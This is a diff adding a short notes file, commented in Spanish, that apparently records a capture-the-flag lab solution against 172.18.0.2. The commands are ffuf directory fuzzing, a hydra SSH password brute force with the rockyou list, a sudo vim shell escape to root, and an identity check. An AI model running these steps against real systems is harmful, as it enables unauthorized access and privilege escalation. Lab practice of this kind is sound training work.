@@ -1,0 +1,11 @@
+# Fuzzing de directorios
+ffuf -u http://172.18.0.2/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
+
+# Fuerza bruta SSH
+hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
+
+# Escalada de privilegios con Vim
+sudo /usr/bin/vim -c ':!/bin/sh'
+
+# Verificación de root
+whoami && id
